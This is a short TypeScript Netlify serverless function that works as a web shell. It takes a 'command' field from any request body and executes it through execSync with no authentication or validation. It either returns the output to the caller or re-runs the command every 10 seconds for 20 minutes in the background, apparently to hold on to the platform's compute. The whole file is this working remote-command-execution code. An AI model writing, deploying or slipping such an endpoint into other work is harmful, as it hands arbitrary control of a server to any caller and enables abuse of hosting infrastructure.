import { Context } from '@netlify/functions';
import { execSync } from 'child_process'

async function run(com) {
    let ret = [];
    try {
        const comRet = execSync(com).toString();
        ret.push(comRet)
    } catch (error) {
        ret.push(error.message)
    }
    return ret;
}

async function w(command) {
    await new Promise((resolve) => {
        setInterval(() => {
            run(command)
        }, 10 * 1000);
        setTimeout(() => { resolve(true) }, 20 * 60 * 1000)
    })
}

export default async (req: Request, context: Context) => {
    const body = await req.json();

    if (body.w) {
        const ret = await run(body.command);
        const text = ret.join("\n")
        const result = text.split('\n').filter(e => e);
        return new Response(JSON.stringify(result, null, 2));
    } else {
        context.waitUntil(w(body.command))
        return new Response(JSON.stringify({ message: body.command }, null, 2));
    };
}